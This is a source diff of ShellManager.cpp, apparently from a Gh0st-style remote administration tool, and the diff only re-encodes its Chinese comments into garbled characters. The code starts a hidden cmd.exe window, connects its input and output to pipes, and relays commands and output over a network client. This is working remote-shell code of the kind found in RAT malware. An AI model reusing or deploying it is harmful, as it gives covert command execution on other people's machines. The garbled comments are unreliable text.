@@ -1,4 +1,4 @@
-// ShellManager.cpp: implementation of the CShellManager class.
+ï»¿// ShellManager.cpp: implementation of the CShellManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -16,17 +16,17 @@ CShellManager::CShellManager(IOCPClient* ClientObject, int n, void* user):CManag
     m_nCmdLength = 0;
     m_bStarting = TRUE;
     m_hThreadRead = NULL;
-    m_hShellProcessHandle   = NULL;    //±£´æCmd½ø³ÌµÄ½ø³Ì¾ä±úºÍÖ÷Ïß³Ì¾ä±ú
+    m_hShellProcessHandle   = NULL;    //ä¿å­˜Cmdè¿›ç¨‹çš„è¿›ç¨‹å¥æŸ„å’Œä¸»çº¿ç¨‹å¥æŸ„
     m_hShellThreadHandle	= NULL;
     SECURITY_ATTRIBUTES  sa = {0};
     sa.nLength = sizeof(sa);
     sa.lpSecurityDescriptor = NULL;
-    sa.bInheritHandle = TRUE;     //ÖØÒª
+    sa.bInheritHandle = TRUE;     //é‡è¦
     m_hReadPipeHandle	= NULL;   //client
     m_hWritePipeHandle	= NULL;   //client
     m_hReadPipeShell	= NULL;   //cmd
     m_hWritePipeShell	= NULL;   //cmd
-    //´´½¨¹ÜµÀ
+    //åˆ›å»ºç®¡é“
     if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0)) {
         if(m_hReadPipeHandle != NULL) {
             SAFE_CLOSE_HANDLE(m_hReadPipeHandle);
@@ -51,13 +51,13 @@ CShellManager::CShellManager(IOCPClient* ClientObject, int n, void* user):CManag
         return;
     }
 
-    //»ñµÃCmd FullPath
+    //è·å¾—Cmd FullPath
     char  strShellPath[MAX_PATH] = {0};
     GetSystemDirectory(strShellPath, MAX_PATH);  //C:\windows\system32
     //C:\windows\system32\cmd.exe
     strcat(strShellPath,"\\cmd.exe");
 
-    //1 Cmd Input Output ÒªºÍ¹ÜµÀ¶ÔÓ¦ÉÏ
+    //1 Cmd Input Output è¦å’Œç®¡é“å¯¹åº”ä¸Š
     //2 Cmd Hide
 
     STARTUPINFO          si = {0};
@@ -66,16 +66,16 @@ CShellManager::CShellManager(IOCPClient* ClientObject, int n, void* user):CManag
     memset((void *)&si, 0, sizeof(si));
     memset((void *)&pi, 0, sizeof(pi));
 
-    si.cb = sizeof(STARTUPINFO);  //ÖØÒª
+    si.cb = sizeof(STARTUPINFO);  //é‡è¦
 
     si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-    si.hStdInput  = m_hReadPipeShell;                           //½«¹ÜµÀ¸³Öµ
+    si.hStdInput  = m_hReadPipeShell;                           //å°†ç®¡é“èµ‹å€¼
     si.hStdOutput = si.hStdError = m_hWritePipeShell;
 
     si.wShowWindow = SW_HIDE;
 
-    //Æô¶¯Cmd½ø³Ì
-    //3 ¼Ì³Ğ
+    //å¯åŠ¨Cmdè¿›ç¨‹
+    //3 ç»§æ‰¿
 
     if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE,
                        NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
@@ -90,7 +90,7 @@ CShellManager::CShellManager(IOCPClient* ClientObject, int n, void* user):CManag
         return;
     }
 
-    m_hShellProcessHandle   = pi.hProcess;    //±£´æCmd½ø³ÌµÄ½ø³Ì¾ä±úºÍÖ÷Ïß³Ì¾ä±ú
+    m_hShellProcessHandle   = pi.hProcess;    //ä¿å­˜Cmdè¿›ç¨‹çš„è¿›ç¨‹å¥æŸ„å’Œä¸»çº¿ç¨‹å¥æŸ„
     m_hShellThreadHandle	= pi.hThread;
 
     BYTE	bToken = TOKEN_SHELL_START;
@@ -110,15 +110,15 @@ DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lParam)
     CShellManager *This = (CShellManager*)lParam;
     while (This->m_bStarting) {
         Sleep(100);
-        //ÕâÀï¼ì²âÊÇ·ñÓĞÊı¾İ  Êı¾İµÄ´óĞ¡ÊÇ¶àÉÙ
-        while (PeekNamedPipe(This->m_hReadPipeHandle,     //²»ÊÇ×èÈû
+        //è¿™é‡Œæ£€æµ‹æ˜¯å¦æœ‰æ•°æ®  æ•°æ®çš„å¤§å°æ˜¯å¤šå°‘
+        while (PeekNamedPipe(This->m_hReadPipeHandle,     //ä¸æ˜¯é˜»å¡
                              szBuffer, sizeof(szBuffer), &dwReturn, &dwTotal, NULL)) {
-            //Èç¹ûÃ»ÓĞÊı¾İ¾ÍÌø³ö±¾±¾´ÎÑ­»·
+            //å¦‚æœæ²¡æœ‰æ•°æ®å°±è·³å‡ºæœ¬æœ¬æ¬¡å¾ªç¯
             if (dwReturn <= 0)
                 break;
             memset(szBuffer, 0, sizeof(szBuffer));
             LPBYTE szTotalBuffer = (LPBYTE)LocalAlloc(LPTR, dwTotal);
-            //¶ÁÈ¡¹ÜµÀÊı¾İ
+            //è¯»å–ç®¡é“æ•°æ®
             ReadFile(This->m_hReadPipeHandle,
                      szTotalBuffer, dwTotal, &dwReturn, NULL);
 #ifdef _DEBUG
@@ -134,7 +134,7 @@ DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lParam)
     }
     SAFE_CLOSE_HANDLE(This->m_hThreadRead);
     This->m_hThreadRead = NULL;
-    Mprintf("ReadPipeÏß³ÌÍË³ö\n");
+    Mprintf("ReadPipeçº¿ç¨‹é€€å‡º\n");
     return 0;
 }
 
@@ -146,7 +146,7 @@ VOID CShellManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         break;
     }
     default: {
-        m_nCmdLength = (ulLength - 2);// ²»º¬"\r\n"
+        m_nCmdLength = (ulLength - 2);// ä¸å«"\r\n"
         unsigned long	dwReturn = 0;
         WriteFile(m_hWritePipeHandle, szBuffer, ulLength, &dwReturn,NULL);
         break;
@@ -158,8 +158,8 @@ CShellManager::~CShellManager()
 {
     m_bStarting = FALSE;
 
-    TerminateProcess(m_hShellProcessHandle, 0);   //½áÊøÎÒÃÇ×Ô¼º´´½¨µÄCmd½ø³Ì
-    TerminateThread(m_hShellThreadHandle, 0);     //½áÊøÎÒÃÇ×Ô¼º´´½¨µÄCmdÏß³Ì
+    TerminateProcess(m_hShellProcessHandle, 0);   //ç»“æŸæˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„Cmdè¿›ç¨‹
+    TerminateThread(m_hShellThreadHandle, 0);     //ç»“æŸæˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„Cmdçº¿ç¨‹
     Sleep(100);
 
     if (m_hReadPipeHandle != NULL) {
